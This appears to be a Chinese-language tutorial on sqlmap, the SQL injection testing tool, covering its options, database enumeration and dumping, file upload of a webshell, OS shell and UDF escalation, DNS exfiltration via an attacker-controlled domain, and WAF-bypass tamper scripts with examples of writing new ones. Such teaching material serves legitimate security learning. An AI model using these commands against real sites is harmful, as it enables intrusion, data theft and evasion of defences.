# Sqlmap-SQL注入漏洞


<!--more-->

学安全的都知道这个注入神器 Sqlmap，也正是这些神器的出现，我们逐渐变成了“脚本小子”，要想变成大佬，就要求不仅会用还会写，在面试中也是经常会问 Sqlmap 原理，或者自动化注入这样的问题，所以就深入来学一学 Sqlmap
Sqlmap 使用 Python 语言开发，原来用的 Python2 新版本 1.5 使用 Python3，分析使用的也是 1.5 版本

- 项目地址：https://github.com/sqlmapproject/sqlmap
- 中文文档：https://sqlmap.campfire.ga
- 阅读文档是发现的一个有趣的项目：中文文档编写指北，https://github.com/mzlogin/chine-copywriting-guidelines

Sqlmap 具有以下功能

- 识别有漏洞的参数
- 针对有漏洞的参数，自动选取对应类型的 SQL 注入技术
- 识别后端 DBMS 的相关指纹信息
- 根据用户使用的选项，它还能采集尽可能多的指纹信息，拉取数据或是掌管整个数据库服务器

之后会对这些功能原理进行分析

![image-20211229131143044](images/df82a208239e430521bdbc67f33afea4.png)

### 基础命令

1. 判断网址有无SQL注入漏洞

`sqlmap -u "⽹址"`
结束以后会得到该⽹站的数据库、操作系统、服务器等版本信息

2. 如果存在漏洞可以使用以下命令注出当前网站下所有数据库名

`sqlmap -u "⽹址" --dbs`

3. 注出指定数据库下的所有表名

`sqlmap -u "⽹址" -D 数据库名 --tables`


4. 注出指定数据库指定表下所有列信息

`sqlmap -u "⽹址" -D 数据库名 -T 表名 --columns`

5. 注出所有指定列数据

`sqlmap -u "⽹址" -D 数据库名 -T 表名 -C 列名 --dump`

在任意环节使用--dumps，可以将所有数据注出，如指定数据库使用，注出所有数据库下的所有表的所有字段信息

`python3 .\sqlmap.py -u "http://127.0.0.1:8888/Less-2/?id=1" -D test --dump`

`--batch`命令可以自动跳过选择项，按默认选项注入

### 进阶命令

此部分参考 sqlmap 手册，在手册基础上进行了精炼

#### 输出信息的详细程度

```sh
-v	#共7个级别(0~6)，默认为1
#可以用 -vv 代替 -v 2，推荐使用这种方法
```

- **0**：只输出 Python 出错回溯信息，错误和关键信息
- **1**：增加输出普通信息和警告信息
- **2**：增加输出调试信息
- **3**：增加输出已注入的 payloads
- **4**：增加输出 HTTP 请求
- **5**：增加输出 HTTP 响应头
- **6**：增加输出 HTTP 响应内容

#### 目标

```sh
-d	#直连数据库，"mysql://root:root@192.168.0.8:3306/testdb"
-u URL
-l	#从Burp代理日志文件中解析目标地址
-m	#从文本文件中批量获取目标
-r	#从文件中读取 HTTP 请求
-g	#使用 Google dork 结果作为目标地址 python sqlmap.py -g "inurl:\".php?id=1\""
-c	#从 INI 配置文件中读取选项

--purge			#清除历史缓存
--flush-session	#清除上次扫描的缓存
```

注：`-d`是一个一个新的开关选项，它允许你通过 DBMS 守护进程监听的 TCP 端口直接连接目标数据库服务器，便于使用 SQL 注入技术对目标数据库进行攻击

#### 指定连接时信息

指定连接目标地址的方式

```sh
--method=METHOD		#强制使用提供的 HTTP 方法（例如：PUT）
--data=DATA			#使用 POST 发送数据串；--data="id=1&user=admin"
--param-del=";"		#使用参数分隔符，--data="id=1;user=admin"
--cookie=COOKIE		#指定 HTTP Cookie ，--cookie "id=11" --level 2
--drop-set-cookie	#忽略 HTTP 响应中的 Set-Cookie 参数
--user-agent=AGENT	#指定 HTTP User-Agent
--random-agent		#使用随机的 HTTP User-Agent，随机从 ./txt/user-agents.txt 选一个，不是每次请求换一个
--host				#手动设置 HTTP Host 请求头值，默认情况下，HTTP Host 请求头从提供的目标 URL 中解析
--referer=REFERER	#指定 HTTP Referer，默认情况下不会在 HTTP 请求中发送 HTTP Referer 请求头
-H HEADER			#设置额外的 HTTP 头参数（例如："X-Forwarded-For: 127.0.0.1"）
--headers=HEADERS	#设置额外的 HTTP 头参数,必须以换行符分隔（例如："Accept-Language: fr\nETag: 123"）
--auth-type，--auth-cred #选项用于指定后端 Web 服务器实现的 HTTP 协议认证和所有向目标程序发起 HTTP 请求的有效凭据，支持的三种 HTTP 协议认证机制是：Basic、Digest、NTLM，认证凭据的语法是 username:password。一个符合语法的例子：$ python sqlmap.py -u "http://192.168.136.131/sqlmap/mysql/basic/get_int.php?id\=1" --auth-type Basic --auth-cred "testuser:testpass"
--auth-file			#HTTP 协议私钥认证
--ignore-code		#忽略（有问题的）HTTP 错误码
--proxy，--proxy-cred，--proxy-file 和 --ignore-proxy	#HTTP(S) 代理，--proxy 并提供 HTTP(S) 代理地址使 HTTP(S) 请求经过该代理到达目标 URL。设置 HTTP(S) 代理的语法是 http://url:port。如果 HTTP(S) 代理需要身份验证，则可以对选项 --proxy-cred 使用 username:password 格式添加对应的凭证可以使用选项 --proxy-file 并指定包含批量代理的文件，想要使用 sqlmap 对本地局域网目标进行测试时应该使用开关 --ignore-proxy 来绕过系统级的 HTTP(S) 代理服务
--delay=10			#设置每个 HTTP 请求的延迟秒数
--safe-freq=SAFE	 #每访问两次给定的合法 URL 才发送一次测试请求
--csrf-token 和 --csrf-url	#绕过反 CSRF 防护
-force-ssl			#支持https的SQL注入只需加入参数-force-ssl告诉sqlmap这是http服务即可
--identify-waf		#检测是否有WAF/IPS/IDS，这个功能以失效
--eval				#在每个请求期间运行自定义的 Python 代码
```

#### 指定注入参数

以下选项用于指定要测试的参数

提供自定义注入 payloads 和篡改参数的脚本

```sh
-p TESTPARAMETER	#指定需要测试的参数
--skip=SKIP			#指定要跳过的参数
--dbms=DBMS			#指定 DBMS 类型（例如：MySQL）
--os=OS				#指定 DBMS 服务器的操作系统类型
--prefix=PREFIX		 #注入 payload 的前缀字符串
--suffix=SUFFIX		 #注入 payload 的后缀字符串
--tamper=TAMPER		 #用给定脚本修改注入数据
--batch				# 自动跳过选择项，按默认选项注入
```

指定检测级别
sqlmap 使用的 payloads 直接从文本文件 xml/payloads.xml 中载入。

根据该文件顶部的相关指导说明进行设置，如果 sqlmap 漏过了特定的注入，

你可以选择自己修改指定的 payload 用于检测。

level有5级，越高检测越全，默认为 1
```
–level 1 检测Get和Post

–level 2 检测HTTP Cookie

–level 3 检测User-Agent和Referer

–level 4 检测

–level 5 检测 HOST 头
```

**risk有3级，级别越高风险越大，默认为1**

```
–risk 2 会在默认的检测上添加大量时间型盲注语句测试

–risk 3 会在原基础上添加OR 类型的布尔型盲注 ，可能会update导致修改数据库
```

页面对比

选项：--string，--not-string，--regexp 和 --code

默认区分一个 True 查询和 False 查询（布尔型盲注背后的相关理念概念）是通过对比注入前后返回的结果页面是否一致进行判断的

不过这个参照方法并不一定有效，因为可能就算没有进行注入，页面内容也会进行相应更新。例如：页面上有计数器、动态的广告横幅、或者任何基于时间而非用户输入内容进行动态渲染的内容。为了避免类似的情况，sqlmap 会尽可能尝试识别出对应的代码段所返回的请求内容并做好相关的处理

如果用户知道可以通过 HTTP 状态码区分 True 查询和 False 查询（例如：200 对应 True，401 对应 False），那么可以向 sqlmap 提供对应的信息。（例如：--code=200）

开关：--text-only 和 --titles

如果用户知道可以通过 HTML 标题区分 True 查询和 False 查询（例如：Welcome 对应 True，Forbidden 对应 False），那么可以使用 --titles 开启基于标题对比的开关

如果 HTTP 响应报文中存在无效信息（例如：脚本、嵌套元素等），可以通过过滤页面的内容（开关 --text-only）而只获取文本内容。通过这种方式，大多数情况下，这样会自动调优检测引擎

#### 指定注入类型

以下选项用于调整特定 SQL 注入技术的测试方法

```sh
--technique=TECH	#使用的 SQL 注入技术（默认为“BEUSTQ”)
B: Boolean-based blind SQL injection（布尔型盲注）
E: Error-based SQL injection（报错型注入）
U: UNION query SQL injection（联合查询注入）
S: Stacked queries SQL injection（堆查询注入）
T: Time-based blind SQL injection（时间型盲注）
Q: inline Query injection（内联查询注入）
# 例如，如果仅测试利用报错型注入和堆叠查询注入，你可以提供 ES

--time-sec=TIMESEC  #设置延时注入的时间（默认为 5）
--second-order=S..  #设置二阶响应的结果显示页面的 URL（该选项用于二阶 SQL 注入）
--dns-domain		#DNS 渗出攻击
# 如果用户正控制着一台注册为 DNS 域名服务器的主机（例如：域名 attacker.com），则可以使用该选项（例如：--dns-domain attacker.com）来启用此攻击。它的前提条件是使用 Administrator（即管理员）权限（因为需要使用特权端口 53）运行 sqlmap，这时可以使用常用的（盲注）技术来进行攻击。如果已经识别出一种有效攻击方式（最好是时间型盲注），则这种攻击能够加速获取数据的过程。如果报错型注入或联合查询注入技术可用，则默认情况下将跳过 DNS 渗出攻击测试
```

#### 枚举信息

以下选项用于获取数据库的信息，结构和数据表中的数据。

```sh
-a, --all          #获取所有信息、数据
-f, --fingerprint	#采用特定 SQL 方言或者内带特定错误信息等技术展开详细的 DBMS 指纹识别
-b, --banner        #获取 DBMS banner,返回数据库的版本号
--current-user			#获取 DBMS 当前用户
--current-db			#获取 DBMS 当前数据库
--hostname				#获取 DBMS 服务器的主机名
--is-dba				#探测 DBMS 当前用户是否为 DBA（数据库管理员）
--users					#枚举出 DBMS 所有用户
--passwords				#枚举出 DBMS 所有用户的密码哈希
--privileges			#枚举出 DBMS 所有用户特权级
--roles					#枚举出 DBMS 所有用户角色

--dbs					#枚举出 DBMS 所有数据库
--tables				#枚举出 DBMS 数据库中的所有表，--exclude-sysdbs 以排除所有的系统数据库，对于 Oracle，你需要提供 TABLESPACE_NAME 而不是数据库名称
--columns				#枚举出 DBMS 表中的所有列，对于 PostgreSQL，你需要提供 public 或系统数据库的名称。这是因为不可能枚举其他数据库表，只能枚举出 Web 应用程序用户连接到的数据库模式下的表，它们总是以 public 为别名
--schema				#枚举出 DBMS 所有模式
--count					#获取数据表数目
--dump-all				#如果当前会话用户的读取权限允许，可以一次导出所有数据库表条目
--dump					#导出 DBMS 数据库表项
--search，-C，-T，-D		#此开关允许你在所有数据库中搜索特定的数据库名和表名，在特定的数据表中搜索特定的列名
--stop 10				#只取前10行数据
    
-D DB					#指定要枚举的 DBMS 数据库
-T TBL					#指定要枚举的 DBMS 数据表
-C COL					#指定要枚举的 DBMS 数据列
    
--sql-query=QUERY		#指定要执行的 SQL 语句
--sql-shell				#调出交互式 SQL shell
```

### 用例

#### 指定数据包注入

- 从文件读取HTTP请求，GET和POST都可以

`sqlmap -r "burp.txt" -p "username"	#-p 指定存在注入的参数`

这里的 txt 文件就是完整的 http 请求包，可以使用 -p 指定参数，也可以在 txt 文件中使用 *（星号）定位，特别是注入点后需要使用闭合语句的情况下

- Cookie注入

`sqlmap -u "http://www.vuln.com" --cookie "id=11" --level 2`

- 当防火墙对请求速度做了限制

```
sqlmap -u "http://www.vuln.com/post.php?id=1" --delay=10

# 在每个HTTP请求之间的延迟10秒
```



#### 伪静态注入

`sqpmap  -u http://victim.com/id/666*.html --dbs  #在html扩展名前加个'*'`

暴力破解
当数据库为以下情况时，需要暴力破解表名和列名

- DBMS（Database Management System，数据库管理系统）是 < 5.0 版本的 MySQL，它们不具备 information_schema
- DBMS 是微软的 Access 数据库，并且其中的系统表 MSysObjects 默认设置不可读
- 当前会话用户对 DBMS 中存储数据表定义的系统表没有读权限

**暴力破解表名**

只要开启了 `--common-tables`，sqlmap 仍然可以识别出部分系统数据表。sqlmap 会尝试对系统表进行暴力破解，试图找出 DBMS 中存在的常见数据表，常见的数据表名列表存储在 `txt/common-tables.txt`，支持用户进行任意修改

```sh
python sqlmap.py -u "http://192.168.136.129/mysql/get_int_4.php?id=1" --common-tables -D testdb
```

#### 暴力破解列名

开启了 --columns 开关，sqlmap 则会提示你是否使用暴力破解技术。因而，就算出现上面两个场景之一，只要你开启了 --common-columns，sqlmap 仍然可以识别出部分系统数据表。sqlmap 会尝试对系统表进行暴力破解，试图找出 DBMS 中存在的常见数据表列名，常见的数据表名列表存储在 txt/common-columns.txt，支持用户进行任意修改

#### 文件操作

仅对MySQL、MSSQL、PostgreSQL有效，可以进行文件操作

前提：

- 数据库用户有读写权限
- 有目录读写文件权限

```sh
sqlmap -u url --is-dba
#查看是否dba权限,必须为root权限

sqlmap -u url --file-read "C:/Windows/win.ini"		
#读取文件

sqlmap -u url --file-write=D:/shell.php --file-dest=C:/www/shell.php
#上传文件 (本地木马路径:目标网站目录)
```

#### 执行命令

仅对MySQL、MSSQL、PosgreSQL有效

前提：

- 数据库用户有读写权限
- 有目录读写文件权限

sqlmap 能够在**数据库所在服务器的操作系统上运行任意的命令**

`sqlmap -u "URL" --os-shell	#获取系统交互shell或--os-cmd=id执行系统命令`

原理就是上传一个 upload 木马后，再上传一个cmd shell

当 --os-shell退出后， 会调用后门脚本删除上传文件后，进行自删除

- 在 MySQL 和 PostgreSQL 中，sqlmap 可以上传一个包含两个用户自定义函数

分别为 sys_exec() 和 sys_eval() 的共享库（二进制文件），然后在数据库中创建出两个对应函数，并调用对应函数执行特定的命令，并允许用户选择是否打印出相关命令执行的结果。

- 在 Microsoft SQL Server 中，sqlmap 会利用 xp_cmdshell 存储过程：

如果该存储过程被关闭了（Microsoft SQL Server 的 2005 及以上版本默认关闭），sqlmap 则会将其重新打开；如果该存储过程不存在，sqlmap 则会重新创建它，当用户请求标准输出，sqlmap 将使用任何可用的 SQL 注入技术（盲注、带内注入、报错型注入）去获取对应结果。相反，如果无需标准输出对应结果，sqlmap 则会使用堆叠查询注入（Stacked queries）技术执行相关的命令。

- 如果堆叠查询没有被 Web 应用识别出来，并且 DBMS 为 MySQL，假如后端 DBMS 和 Web 服务器在同一台服务器上，则仍可以通过利用 SELECT 语句中的 INTO OUTFILE，在 根目录可写目录中写shell
  

#### UDF提权

可以通过编译 MySQL 或 PostgreSQL 共享库（在 Windows 上为 DLL，在 Linux/Unix 上为共享对象（shared object））来注入自己的用户自定义函数（UDFs），然后将本地存储共享库的目录路径提供给 sqlmap。sqlmap 会根据你的选择决定下一步是向数据库服务器文件系统上传共享库到还是创建用户自定义函数。当你完成注入 UDFs 的使用后，sqlmap 还可以将它们从数据库中删除

使用选项 --udf-inject 并按照说明进行操作即可；如果需要，也可以使用 --shared-lib 选项通过命令行指定共享库的本地文件系统路径，否则 sqlmap 会在运行时向你询问路径

此功能仅对 MySQL 或 PostgreSQL 有用

有状态带外连接：Meterpreter & friends
开关和选项：--os-pwn，--os-smbrelay，--os-bof，--priv-esc，--msf-path 和 --tmp-path

当后端 DBMS 为 MySQL，PostgreSQL 或 Microsoft SQL Server 时，并且当前会话用户拥有对数据库特定功能和架构缺陷的利用权限时，sqlmap 能够在攻击者机器与数据库服务器之间建立起有状态带外 TCP 连接。根据用户的选择，该连接可以是交互式命令行、Meterpreter 会话、或者图形用户界面（VNC）会话

sqlmap 依赖 Metasploit 创建 shellcode，并实现了四种不同的技术在数据库服务器上执行它。这些技术分别是：

- 通过 sqlmap 的用户自定义函数 sys_bineval() 在数据库内存中执行 Metasploit shellcode。MySQL 和 PostgreSQL 支持该技术，通过开关 --os-pwn 启用
- 通过 sqlmap 的用户自定义函数 sys_exec() 向 MySQL 和 PostgreSQL 上传一个 Metasploit 独立 payload 传输器并执行，对于 Microsoft SQL Server 则是使用 xp_cmdshell() 函数，通过开关 --os-pwn 启用

- 通过进行从数据库服务器到攻击者机器（由 Metasploit smb_relay 服务监听）之间的 UNC 路径请求的 SMB 反射攻击（MS08-068）来执行 Metasploit shellcode。当 sqlmap 运行于具有高权限（uid=0）的 Linux/Unix 上，且目标 DBMS 以 Windows 管理员身份运行时支持该技术，通过开关 --os-smbrelay 启用
- 通过利用 Microsoft SQL Server 2000 和 2005 的 sp_replwritetovarbin 存储过程堆缓冲区溢出（MS09-004）在数据库内存中执行 Metasploit shellcode。sqlmap 使用自己的 exploit，自动绕过 DEP 内存保护来触发漏洞，但它依赖 Metasploit 生成 shellcode，以便在成功利用时执行，通过开关 --os-bof 启用



#### 访问 Windows 注册表

条件：

- DBMS（Database Management System，数据库管理系统）是 MySQL，PostgreSQL 或 Microsoft SQL Server
- Web 应用程序支持堆叠查询
- 会话用户必须具备相应的访问权限

```sh
--reg-read		#读取 Windows 注册表键值
--reg-add		#写入 Windows 注册表键值
--reg-del		#删除 Windows 注册表项
--reg-key，--reg-value，--reg-data 和 --reg-type #注册表辅助选项
```

#### 常规选项

```sh
-s			#从已存储（.sqlite）文件读取会话
#qlmap 会在专用的输出目录中自动为每一个目标分别建立持久会话 SQLite 文件，该文件会存储用于恢复会话的所有数据。如果用户需要指定会话文件的具体存储位置（例如：将所有目标的会话数据存储在同一个位置），则可以使用这个选项
-t			#记录 HTTP(s) 访问信息到文本文件,这个选项需要一个指定文本文件地址的参数，用于写入 sqlmap 产生的所有 HTTP(s) 流量信息——包括 HTTP(S) 请求 和 HTTP(S) 响应
--batch		#以非交互式模式运行,当 sqlmap 需要用户输入信息时，都将会以默认参数运行
--update	#更新 sqlmap
--flush-session #清空会话文件
更多选项：
https://sqlmap.campfire.ga/usage/general
```

### Tamper脚本

此部分转载自li qun师傅博客：https://ailiqun.xyz/2020/06/15/tamper

tamper 脚本可以用来对 sqlmap 的 sql 查询语句进行一次处理，让其绕过过滤，tamper 脚本在 sqlmap 安装目录的 tamper 目录下

`use age：sqlmap.py --tamper="模块名.py"`

tamper 适用的数据库类型 & 版本



#### 自带tamper介绍

```
apostrophemask.py
功能：对引号进行 utf-8 格式编码 (% EF% BC%87)
平台：All
举例：1 AND ‘1’=’1 ==> 1 AND % EF% BC%871% EF% BC%87=% EF% BC%871

apostrophenullencode.py
功能：用非法的双 unicode 字符 (%00%27) 替换引号字符
平台：All
举例：1 AND ‘1’=’1 ==> 1 AND %00%271%00%27=%00%271

appendnullbyte.py
功能：在有效载荷结束位置加载零字节字符编码
平台：Microsoft Access
举例：1 AND 1=1 ==> 1 AND 1=1%00

base64encode.py
功能：用 base64 格式进行编码
平台：All
举例：1’ AND SLEEP (5)# ==> MScgQU5EIFNMRUVQKDUpIw==

between.py
功能：用 between 替换大于号（>）
平台：Mssql2005、MySQL 4/5.0/5.5、Oracle 10g、PostgreSQL 8.3/8.4/9.0
举例：
1 AND A > B –  ==> 1 AND A NOT BETWEEN 0 AND B  –
1 AND A = B –  ==> 1 AND A BETWEEN B AND B –

bluecoat.py
功能：对 SQL 语句替换空格字符为 (%09)，并替换”=”—>”LIKE”
平台：MySQL 5.1, SGOS
举例：SELECT username FROM users WHERE id = 1 ==> SELECT%09username FROM%09users WHERE%09id LIKE 1

apostrophemask.py
功能：用 utf-8 格式编码引号 (如：% EF% BC%87)
平台：All
举例：1 AND ‘1’=’1 ==> 1 AND % EF% BC%871% EF% BC%87=% EF% BC%871

charunicodeencode.py
功能：对字符串进行 Unicode 格式转义编码
平台：Mssql 2000,2005、MySQL 5.1.56、PostgreSQL 9.0.3 ASP/ASP.NET
举例：SELECT FIELD%20FROM TABLE ==> % u0053% u0045% u004C% u0045% u0043% u0054% u0020% u0046% u0049% u0045% u004C% u0044% u0020% u0046% u0052% u004F% u004D% u0020% u0054% u0041% u0042% u004C% u0045

charencode.py
功能：采用 url 格式编码 1 次
平台：Mssql 2005、MySQL 4, 5.0 and 5.5、Oracle 10g、PostgreSQL 8.3, 8.4, 9.0
举例：SELECT FIELD FROM%20TABLE ==> %53%45%4C%45%43%54%20%46%49%45%4C%44%20%46%52%4F%4D%20%54%41%42%4C%45

chardoubleencode.py
功能：采用 url 格式编码 2 次
平台：All
举例：SELECT FIELD FROM%20TABLE ==> %2553%2545%254C%2545%2543%2554%2520%2546%2549%2545%254C%2544%2520%2546%2552%254F%254D%2520%2554%2541%2542%254C%2545

commalessmid.py
功能：将 payload 中的逗号用 from 和 for 代替，用于过滤了逗号并且是 3 个参数的情况
平台：MySQL 5.0, 5.5
举例：MID (VERSION (), 1, 1) ==> MID (VERSION () FROM 1 FOR 1)

concat2concatws.py
功能：CONCAT () ==> CONCAT_WS ()，用于过滤了 CONCAT () 函数的情况
平台： MySQL 5.0
举例：CONCAT (1,2) ==> CONCAT_WS (MID (CHAR (0),0,0),1,2)

equaltolike.py
功能：= ==> LIKE，用于过滤了等号”=” 的情况
平台：Mssql 2005、MySQL 4, 5.0 and 5.5
举例：SELECT * FROM users WHERE id=1 ==> SELECT * FROM users WHERE id LIKE 1

greatest.py
功能：> ==> GREATEST
平台：MySQL 4, 5.0 and 5.5、Oracle 10g、PostgreSQL 8.3, 8.4, 9.0
举例：1 AND A > B ==> 1 AND GREATEST (A, B+1)=A
a 和 b+1 比较，取两者中的最大值为 a；则 a >= b+1，亦即 a > b

halfversionedmorekeywords.py
功能：空格 ==> / !0 （在关键字前添加注释）
平台：MySQL 4.0.18, 5.0.22（Mysql < 5.1）
举例：union ==> /!0union

ifnull2ifisnull.py
功能：IFNULL (A, B) ==> IF (ISNULL (A), B, A)
平台：MySQL 5.0 and 5.5
举例：IFNULL (1, 2) ==> IF (ISNULL (1),2,1)

informationschemacomment.py
功能：
在 information_schema 后面加上 // ，用于绕过对 information_schema 的情况
retVal = re.sub(r”(?i)(information_schema).”, “g<1>/ /.”, payload)
平台：All
举例：select table_name from information_schema.tables ==> select table_name from information_schema/**/.tables

lowercase.py
功能：将 payload 里的大写转为小写
平台：Mssql 2005、MySQL 4, 5.0 and 5.5、Oracle 10g、PostgreSQL 8.3, 8.4, 9.0
举例：SELECT table_name FROM INFORMATION_SCHEMA.TABLES ==> select table_name from information_schema.tables

modsecurityversioned.py
功能：用注释来包围完整的查询语句，用于绕过 ModSecurity 开源 waf
平台：MySQL 5.0
举例：1 AND 2>1–  ==> 1 /!30874AND 2>1/–

modsecurityzeroversioned.py
功能：用注释来包围完整的查询语句，用于绕过 waf ，和上面类似
平台：Mysql
举例：1 and 2>1–+ ==> 1 /!00000and 2>1/–+

multiplespaces.py
功能：围绕 SQL 关键字添加多个空格
平台：All
举例：1 UNION SELECT foobar ==> 1   UNION   SELECT   foobar

nonrecursivereplacement.py
功能：关键字双写，可用于关键字过滤
平台：All
举例：1 UNION SELECT 2–  ==> 1 UNIONUNION SELESELECTCT 2–

overlongutf8.py
功能： 转换给定的 payload 当中的所有字符
平台：All
举例：SELECT FIELD FROM TABLE WHERE 2>1 ==> SELECT% C0% AAFIELD% C0% AAFROM% C0% AATABLE% C0% AAWHERE% C0% AA2% C0% BE1

percentage.py
功能：用百分号来绕过关键字过滤，在关键字的每个字母前面都加一个 (%)
平台：Mssql 2000, 2005、MySQL 5.1.56, 5.5.11、PostgreSQL 9.0
举例：SELECT FIELD FROM TABLE ==> % S% E% L% E% C% T % F% I% E% L% D % F% R% O% M % T% A% B% L% E

randomcase.py
功能：将 payload 随机大小写
平台：Mssql 2005、MySQL 4, 5.0 and 5.5、Oracle 10g、PostgreSQL 8.3, 8.4, 9.0
举例：INSERT ==> InseRt

randomcomments.py
功能：在 payload 的关键字中间随机插入注释符 /**/ ，可用于绕过关键字过滤
平台：Mysql
举例：INSERT ==> I / ** / N / ** / SERT

securesphere.py
功能：在 payload 后追加特殊构造的字符串
平台：All
举例：1 AND 1=1 ==> 1 AND 1=1 and ‘0having’=’0having’

space2comment.py
功能：用注释符 // 代替空格，用于空格的绕过
平台：Mssql 2005、MySQL 4, 5.0 and 5.5、Oracle 10g、PostgreSQL 8.3, 8.4, 9.0
举例：SELECT id FROM users ==> SELECT//id//FROM//users

space2dash.py
功能：用 [注释符 (–)+ 一个随机字符串 + 一个换行符] 替换控制符
平台：MSSQL、 SQLite
举例：union select 1,2–+ ==> union–HSHjsJh%0Aselect–HhjHSJ%0A1,2–+

space2hash.py
功能：用 [注释符 (#)+ 一个随机字符串 + 一个换行符] 替换控制符
平台：Mysql
举例：union select 1,2–+ ==> union%23HSHjsJh%0Aselect%23HhjHSJ%0A1,2–+

space2morehash.py
功能：用多个 [注释符 (#)+ 一个随机字符串 + 一个换行符] 替换控制符
平台：MySQL >= 5.1.13
举例：union select 1,2–+ ==> union %23 HSHjsJh %0A select %23 HhjHSJ %0A%23 HJHJhj %0A 1,2–+

space2mssqlblank.py
功能：用随机的空白符替换 payload 中的空格
blanks = (‘%01’, ‘%02’, ‘%03’, ‘%04’, ‘%05’, ‘%06’, ‘%07’, ‘%08’, ‘%09’, ‘%0B’, ‘%0C’, ‘%0D’, ‘%0E’, ‘%0F’, ‘%0A’)
平台：Mssql 2000,2005
举例：SELECT id FROM users ==> SELECT%0Eid%0DFROM%07users

space2mssqlhash.py
功能：用 [字符# + 一个换行符] 替换 payload 中的空格
平台：MSSQL、MySQL
举例：union select 1,2–+ ==> union%23%0Aselect%23%0A1,2–+

space2plus.py
功能：用加号 (+) 替换空格
平台：All
举例：SELECT id FROM users ==> SELECT+id+FROM+users

space2randomblank.py
功能：用随机的空白符替换 payload 中的空格
平台：Mssql 2005、MySQL 4, 5.0 and 5.5、Oracle 10g、PostgreSQL 8.3, 8.4, 9.0
举例：SELECT id FROM users ==> SELECT%0Did%0DFROM%0Ausers

sp_password.py
功能：在 payload 语句后添加 sp_password ，用于迷惑数据库日志（Space ==> sp_password）
平台：Mssql
举例：1 AND 9227=9227–  ==> 1 AND 9227=9227 – sp_password

symboliclogical.py
功能：用 && 替换 and ，用 || 替换 or ，用于这些关键字被过滤的情况
平台：All
举例：
1 and 1=1 ==> 1 %26%26 1=1
1 or 1=1 ==> 1 %7c%7c 1=1

unionalltounion.py
功能：用 union select 替换 union all select
平台：All
举例：union all select 1,2–+ ==> union select 1,2–+

unmagicquotes.py
功能：用宽字符绕过 GPC addslashes
平台：All
举例：1’ and 1=1 ==> 1% df%27 and 1=1–

uppercase.py
功能：将 payload 中的小写字母转为大写格式
平台：Mssql 2005、MySQL 4, 5.0 and 5.5、Oracle 10g、PostgreSQL 8.3, 8.4, 9.0
举例：insert ==> INSERT

varnish.py
功能：添加一个 HTTP 头 “X-originating-IP” 来绕过 WAF
平台：headers = kwargs.get (“headers”, {}) headers [“X-originating-IP”] = “127.0.0.1”return payload
举例：All

versionedkeywords.py
功能：对非函数的关键字进行注释
平台：MySQL 4.0.18, 5.1.56, 5.5.11
举例：1 union select user () ==> 1/!UNION//!SELECT/user ()

versionedmorekeywords.py
功能：对每个关键字进行注释处理
平台：MySQL 5.1.56, 5.5.11
举例：1 union select user () ==> 1/!UNION//!SELECT/user ()

xforwardedfor.py
功能：添加一个伪造的 HTTP 头 “X-Forwarded-For” 来绕过 WAF
平台：All
举例：headers = kwargs.get (“headers”, {}) headers [“X-Forwarded-For”] = randomIP () return payload
```

#### 编写tamper

先来看一个简单的 tamper：apostrophemask.py

```python
# Needed imports
from lib.core.enums import PRIORITY

# Define which is the order of application of tamper scripts against
# the payload
__priority__ = PRIORITY.NORMAL

def tamper(payload, **kwargs):
    '''
    Description of your tamper script
    '''

    retVal = payload.replace('\'', "%EF%BC%87") if payload else payload

    # your code to tamper the original payload

    # return the tampered payload
    return retVal
```

这个 tamper 非常的简单，写的话参考这个就可以了，先来分析这里边有什么元素

- import部分

- \__priority__ 属性

- dependencies函数

- tamper函数以及用户自定义的函数

import部分

可以导入sqlmap的内部库，sqlmap 为我们提供了很多封装好的函数和数据类型，比如上面的的PRIORITY就来源于

`sqlmap/lib/core/enums.py`

priority

定义当前 tamper 的优先级，用于有多个tamper脚本的情况，有以下参数
```python
class PRIORITY:
    LOWEST = -100
    LOWER = -50
    LOW = -10
    NORMAL = 0
    HIGH = 10
    HIGHER = 50
    HIGHEST = 100
```

dependencies

函数声明该脚本适用/不适用的范围，可以为空，比如以下代码

```python
# sqlmap/tamper/echarunicodeencode.py
from lib.core.common import singleTimeWarnMessage
 
def dependencies():
    singleTimeWarnMessage("tamper script '%s' is only meant to be run against ASP or ASP.NET web applications" % os.path.basename(__file__).split(".")[0])
 
# singleTimeWarnMessage() 于在控制台中打印出警告信息
```

数据库有以下名称，在`lib\core\enums.py`可以看到全部

```python
class DBMS:
    ACCESS = "Microsoft Access"
    DB2 = "IBM DB2"
    FIREBIRD = "Firebird"
    MAXDB = "SAP MaxDB"
    MSSQL = "Microsoft SQL Server"
    MYSQL = "MySQL"
    ORACLE = "Oracle"
    PGSQL = "PostgreSQL"
    SQLITE = "SQLite"
    SYBASE = "Sybase"
    HSQLDB = "HSQLDB"
    ......
```

tamper函数

主要功能实现的函数，其中 payload 参数就是原始的 sqlmap的原始注入payload，我们要实现绕过，一般就是针对这个 payload 的修改

比如双写绕过的 payload

```python
def tamper(payload, **kwargs):
    payload = payload.lower()
    payload = payload.replace('select','seleselectct')
    payload = payload.replace('union','ununionion')
    return payload
```

第二个参数：`**kwargs`中包含了 http 头的数据，可以从`kwargs`中取出`headers`数组在进行更改

比如将 http 头中的 xff 头变为随机 ip

```python
def tamper(payload, **kwargs):
	headers = kwargs.get("headers", {})
	headers["X-Forwarded-For"] = randomIP()
	return payload

```


